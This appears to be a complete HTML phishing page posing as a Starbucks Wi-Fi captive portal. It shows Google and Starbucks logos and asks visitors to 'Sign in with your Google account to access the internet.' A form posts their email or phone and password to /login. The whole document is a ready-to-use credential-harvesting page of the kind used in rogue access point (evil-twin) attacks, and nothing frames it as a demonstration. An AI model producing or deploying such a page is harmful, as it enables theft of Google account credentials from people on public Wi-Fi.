<html>
<head>
  <title>Connect</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    @font-face {
      font-family: 'Open Sans';
      font-style: normal;
      font-weight: 400;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-regular.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-regular.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: normal;
      font-weight: 700;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-700.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-700.woff') format('woff');
    }
    @font-face {
      font-family: 'Open Sans';
      font-style: italic;
      font-weight: 400;
      src:
        local(''),
        url('/fonts/open-sans-v28-latin-italic.woff2') format('woff2'),
        url('/fonts/open-sans-v28-latin-italic.woff') format('woff');
    }

    * {
      font-family: 'Open Sans', sans-serif;
    }
  </style>
</head>

<body>
  <div style="width:100%;height:100%;display:flex;flex-direction:column;align-items:center;justify-content:center">
    <div style="display:flex;align-items:center;gap:15px">
      <img src="/google.png" style="width:80px;height:80px">
      <img src="/thin-x.png" style="width:30px;height:30px">
      <img src="/starbucks.png" style="width:80px;height:80px">
    </div>
    <p style="margin-top:30px;font-size:18px">Sign in with your Google account to access the internet.</p>
    <form action="/login" method="post" style="display:flex;flex-direction:column;align-items:center;gap:10px">
      <input type="text" id="input_username" name="username" placeholder="Email or phone" style="width:400px;height:60px;margin-top:20px;font-size:15px;border-radius:5px;border:2px solid lightgray;outline:none;padding:0 20px 0 20px">
      <input type="text" id="input_password" name="password" placeholder="Password" style="width:400px;height:60px;font-size:15px;border-radius:5px;border:2px solid lightgray;outline:none;padding:0 20px 0 20px">
      <div style="width:100%;margin-top:40px;display:flex;justify-content:flex-end">
        <input type="submit" value="Sign in" style="font-size:20px;padding:10px 30px 10px 30px;border:none;background-color:#1a73e8;color:white;border-radius:5px">
      </div>
    </form>
  </div>
</body>
</html>
